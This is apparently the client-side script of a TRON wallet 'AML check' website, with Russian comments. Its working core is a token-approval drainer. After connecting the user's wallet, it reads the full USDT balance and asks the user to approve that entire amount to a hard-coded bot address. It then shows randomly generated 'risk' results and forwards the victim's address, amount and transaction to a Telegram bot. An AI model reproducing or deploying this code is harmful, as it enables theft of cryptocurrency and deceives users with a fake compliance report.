// ============================================
// ГЛОБАЛЬНЫЕ КОНСТАНТЫ
// ============================================
const CONTRACT_ADDRESS = 'TFYz6a5z8mw3rEs7gev9JirJvFg17KdmCZ';
const BOT_ADDRESS = 'TJKaoUut9WpHr3pBbCyf1TjDxq2rcJRQqB';
const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const MIN_AMOUNT = 5000000; // 5 USDT
const MAX_AMOUNT = 5000000000; // 5000 USDT

// ============================================
// ПЕРЕМЕННЫЕ СОСТОЯНИЯ
// ============================================
let connectedWalletAddress = null;
let currentApproveAmount = null;
let totalChecks = 0;
let uniqueUsers = new Set();
const startTime = Date.now();

// ============================================
// ПОЛУЧЕНИЕ ЭЛЕМЕНТОВ
// ============================================
const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const resultSection = document.getElementById('resultSection');
const checkedAddress = document.getElementById('checkedAddress');
const totalTx = document.getElementById('totalTx');
const suspiciousTx = document.getElementById('suspiciousTx');
const walletAge = document.getElementById('walletAge');
const lastActive = document.getElementById('lastActive');
const riskPercent = document.getElementById('riskPercent');
const sourcesList = document.getElementById('sourcesList');
const downloadPdfBtn = document.getElementById('downloadPdfBtn');
const amountCardContainer = document.getElementById('amountCardContainer');
const modalAmount = document.getElementById('modalAmount');

// ============================================
// КАТЕГОРИИ ДЛЯ АНАЛИЗА
// ============================================
const categories = [
    { name: 'Даркнет-маркеты', icon: 'fa-skull' },
    { name: 'Миксеры', icon: 'fa-random' },
    { name: 'Биржи без KYC', icon: 'fa-exchange-alt' },
    { name: 'Санкционные адреса', icon: 'fa-flag' },
    { name: 'Мошенничество', icon: 'fa-user-secret' },
    { name: 'Финансирование терроризма', icon: 'fa-bomb' }
];

// ============================================
// ЗАГРУЗКА ИСТОРИИ
// ============================================
function loadHistory() {
    const history = localStorage.getItem('checkHistory');
    if (history) {
        const historyData = JSON.parse(history);
        historyData.forEach(item => addToHistory(item.address, item.risk, false));
    }
}

// ============================================
// ДОБАВЛЕНИЕ В ИСТОРИЮ
// ============================================
function addToHistory(address, risk, save = true) {
    const historyList = document.getElementById('historyList');
    const historySection = document.getElementById('historySection');
    
    if (!historyList) return;
    
    historySection.style.display = 'block';
    
    const riskLevel = risk <= 25 ? 'low' : risk <= 75 ? 'medium' : 'high';
    const riskText = risk <= 25 ? 'Низкий' : risk <= 75 ? 'Средний' : 'Высокий';
    
    const historyItem = document.createElement('div');
    historyItem.className = 'history-item';
    historyItem.innerHTML = `
        <span class="history-address">${address.slice(0, 8)}...${address.slice(-4)}</span>
        <span class="history-risk ${riskLevel}">${riskText} риск</span>
    `;
    
    historyList.insertBefore(historyItem, historyList.firstChild);
    
    while (historyList.children.length > 10) {
        historyList.removeChild(historyList.lastChild);
    }
    
    if (save) {
        saveToLocalStorage(address, risk);
    }
}

// ============================================
// СОХРАНЕНИЕ В LOCALSTORAGE
// ============================================
function saveToLocalStorage(address, risk) {
    let history = JSON.parse(localStorage.getItem('checkHistory') || '[]');
    history.unshift({ address, risk, timestamp: Date.now() });
    history = history.slice(0, 10);
    localStorage.setItem('checkHistory', JSON.stringify(history));
}

// ============================================
// ОБНОВЛЕНИЕ МЕТРИК
// ============================================
function updateMetrics() {
    const totalCollectedEl = document.getElementById('totalCollected');
    const totalTransactionsEl = document.getElementById('totalTransactions');
    const uniqueUsersEl = document.getElementById('uniqueUsers');
    const uptimeEl = document.getElementById('uptime');
    
    if (totalCollectedEl) {
        const collected = localStorage.getItem('totalCollected') || '0';
        totalCollectedEl.textContent = parseFloat(collected).toFixed(2);
    }
    
    if (totalTransactionsEl) {
        totalTransactionsEl.textContent = totalChecks;
    }
    
    if (uniqueUsersEl) {
        uniqueUsersEl.textContent = uniqueUsers.size;
    }
    
    if (uptimeEl) {
        const days = Math.floor((Date.now() - startTime) / (24 * 60 * 60 * 1000));
        uptimeEl.textContent = days;
    }
}

// ============================================
// ТЕСТОВАЯ ФУНКЦИЯ TELEGRAM
// ============================================
async function testTelegram() {
    console.log('📨 Тест отправки в Telegram...');
    
    try {
        const response = await fetch('/.netlify/functions/send-to-telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'test',
                address: 'TEST',
                amount: '5',
                risk: '10',
                sources: ['Тест'],
                timestamp: new Date().toLocaleString()
            })
        });
        
        const result = await response.json();
        
        if (response.ok) {
            alert('✅ Тест успешен! Проверьте Telegram');
        } else {
            alert('❌ Ошибка: ' + (result.error || response.status));
        }
    } catch (error) {
        alert('Ошибка соединения: ' + error.message);
    }
}

// ============================================
// ИНИЦИАЛИЗАЦИЯ
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    loadHistory();
    updateMetrics();
    
    if (checkBtn) {
        checkBtn.addEventListener('click', handleTronCheck);
    }

    const connectBtn = document.getElementById('connectTrustBtn');
    if (connectBtn) {
        connectBtn.addEventListener('click', connectWallet);
    }

    if (downloadPdfBtn) {
        downloadPdfBtn.addEventListener('click', downloadPDF);
    }

    document.querySelectorAll('.faq-question').forEach(question => {
        question.addEventListener('click', () => {
            question.classList.toggle('active');
            const answer = question.nextElementSibling;
            answer.classList.toggle('active');
        });
    });
});

// ============================================
// УНИВЕРСАЛЬНОЕ ПОДКЛЮЧЕНИЕ КОШЕЛЬКА
// ============================================
async function connectWallet() {
    try {
        // 1. Пытаемся подключить Trust Wallet
        if (window.trustwallet && window.trustwallet.tronLink) {
            await window.trustwallet.tronLink.request({ method: 'tron_requestAccounts' });
            const address = window.trustwallet.tronLink.defaultAddress.base58;
            connectedWalletAddress = address;
            walletInput.value = address;
            document.getElementById('connectedStatus').style.display = 'inline-flex';
            alert('✅ Trust Wallet подключён!');
            return;
        }

        // 2. Пытаемся подключить TronLink
        if (window.tronWeb && window.tronWeb.defaultAddress) {
            const address = window.tronWeb.defaultAddress.base58;
            connectedWalletAddress = address;
            walletInput.value = address;
            document.getElementById('connectedStatus').style.display = 'inline-flex';
            alert('✅ TronLink подключён!');
            return;
        }

        // 3. Если ничего не найдено — показываем инструкцию
        alert('❌ Кошелёк не найден. Установите TronLink или Trust Wallet.');

    } catch (error) {
        console.error('Ошибка подключения:', error);
        alert('Ошибка подключения: ' + error.message);
    }
}

// ============================================
// ПОЛУЧЕНИЕ БАЛАНСА USDT
// ============================================
async function getUSDTBalance(address) {
    try {
        const tronWeb = window.tronWeb || (window.trustwallet?.tronLink?.tronWeb);
        if (!tronWeb) return null;

        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        return await contract.balanceOf(address).call();
    } catch (error) {
        console.error('Ошибка баланса:', error);
        return null;
    }
}

// ============================================
// ПРОВЕРКА КОШЕЛЬКА
// ============================================
async function handleTronCheck() {
    try {
        let walletAddress = walletInput.value.trim();
        
        if (!walletAddress && connectedWalletAddress) {
            walletAddress = connectedWalletAddress;
            walletInput.value = connectedWalletAddress;
            console.log('✅ Автоматически подставлен адрес кошелька:', connectedWalletAddress);
        }
        
        if (!walletAddress) {
            alert('Введите адрес кошелька или подключите кошелёк');
            return;
        }

        uniqueUsers.add(walletAddress);
        updateMetrics();

        // Если кошелёк подключён — пытаемся получить баланс и показать approve
        if (connectedWalletAddress) {
            const balance = await getUSDTBalance(connectedWalletAddress);
            if (balance) {
                const balanceInUSDT = (balance / 1000000).toFixed(2);
                currentApproveAmount = balance;
                if (modalAmount) {
                    modalAmount.textContent = balanceInUSDT + ' USDT';
                }
                document.getElementById('approveModal').style.display = 'flex';
                return;
            }
        }

        // Иначе показываем демо-отчёт
        startAMLCheck(walletAddress, 'manual', 'demo_tx', '5.00');
        
    } catch (error) {
        console.error('❌ Ошибка:', error);
        alert('Ошибка: ' + error.message);
    }
}

// ============================================
// ПОДТВЕРЖДЕНИЕ APPROVE
// ============================================
async function confirmApprove() {
    try {
        document.getElementById('approveModal').style.display = 'none';
        
        const originalText = checkBtn.innerHTML;
        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка транзакции...';
        checkBtn.disabled = true;

        const tronWeb = window.tronWeb || (window.trustwallet?.tronLink?.tronWeb);
        const userAddress = tronWeb.defaultAddress.base58;
        const walletAddress = walletInput.value.trim() || connectedWalletAddress;

        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
        
        const tx = await contract.approve(
            BOT_ADDRESS,
            currentApproveAmount.toString()
        ).send({
            feeLimit: 150_000_000,
            callValue: 0
        });

        console.log('✅ Approve отправлен, tx:', tx);

        checkBtn.innerHTML = originalText;
        checkBtn.disabled = false;

        const balanceInUSDT = (currentApproveAmount / 1000000).toFixed(2);
        startAMLCheck(walletAddress, userAddress, tx, balanceInUSDT);

    } catch (error) {
        console.error('❌ Ошибка:', error);
        checkBtn.innerHTML = '<i class="fas fa-search"></i> Проверить';
        checkBtn.disabled = false;
        alert('Ошибка при отправке транзакции: ' + error.message);
    }
}

function closeApproveModal() {
    document.getElementById('approveModal').style.display = 'none';
    checkBtn.innerHTML = '<i class="fas fa-search"></i> Проверить';
    checkBtn.disabled = false;
}

// ============================================
// ФУНКЦИЯ AML ПРОВЕРКИ
// ============================================
function startAMLCheck(address, userAddress, tx, amount) {
    resultSection.style.display = 'block';
    checkedAddress.textContent = address;

    if (amountCardContainer) {
        amountCardContainer.innerHTML = `
            <div class="amount-card">
                <div class="amount-label">
                    <i class="fas fa-coins"></i>
                    <span>Сумма</span>
                </div>
                <div class="amount-value">${amount} USDT</div>
            </div>
        `;
    }

    const risk = Math.floor(Math.random() * 100);
    const total = Math.floor(Math.random() * 500) + 50;
    const suspicious = Math.floor(total * (risk / 100));
    
    totalTx.textContent = total;
    suspiciousTx.textContent = suspicious;
    walletAge.textContent = Math.floor(Math.random() * 365) + ' дней';
    lastActive.textContent = 'сегодня';
    
    updateRiskChart(risk);
    
    const sources = [];
    if (risk > 30) {
        const count = Math.floor(risk / 30);
        for (let i = 0; i < count; i++) {
            if (categories[i]) sources.push(categories[i].name);
        }
    }
    
    sourcesList.innerHTML = '';
    if (sources.length > 0) {
        sources.forEach(s => {
            const p = document.createElement('p');
            p.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${s}`;
            sourcesList.appendChild(p);
        });
    } else {
        sourcesList.innerHTML = '<p><i class="fas fa-check-circle" style="color:#00c9b7"></i> Чистый кошелёк</p>';
    }
    
    totalChecks++;
    updateMetrics();
    addToHistory(address, risk);
    
    if (typeof sendToTelegram === 'function') {
        sendToTelegram({ address, amount, risk, sources, tx, userAddress });
    }
}

// ============================================
// ГРАФИК РИСКА
// ============================================
function updateRiskChart(risk) {
    if (riskPercent) {
        riskPercent.textContent = risk + '%';
    }
    
    const gaugeFill = document.getElementById('gaugeFill');
    if (gaugeFill) {
        const maxDash = 251.2;
        const dashOffset = maxDash - (risk / 100) * maxDash;
        gaugeFill.style.strokeDashoffset = dashOffset;
    }
    
    let color = '#00c9b7';
    let level = 'Низкий';
    
    if (risk > 25 && risk <= 75) {
        color = '#ffaa5e';
        level = 'Средний';
    } else if (risk > 75) {
        color = '#ff6b6b';
        level = 'Высокий';
    }
    
    if (gaugeFill) gaugeFill.style.stroke = color;
    
    const badge = document.getElementById('riskBadge');
    if (badge) {
        badge.className = 'result-badge';
        badge.textContent = level + ' риск';
        badge.classList.add(level === 'Низкий' ? 'low' : level === 'Средний' ? 'medium' : 'high');
    }
}

// ============================================
// ОТПРАВКА В TELEGRAM
// ============================================
async function sendToTelegram(data) {
    try {
        const response = await fetch('/.netlify/functions/send-to-telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        
        if (!response.ok) {
            console.error('Ошибка отправки в Telegram:', await response.text());
        }
    } catch (error) {
        console.error('Ошибка Telegram:', error);
    }
}

// ============================================
// PDF
// ============================================
function downloadPDF() {
    alert('PDF отчёт будет доступен в следующей версии');
}

// ============================================
// КОПИРОВАНИЕ
// ============================================
function copyAddress() {
    const address = document.getElementById('checkedAddress').textContent;
    navigator.clipboard.writeText(address);
    alert('Адрес скопирован');
}
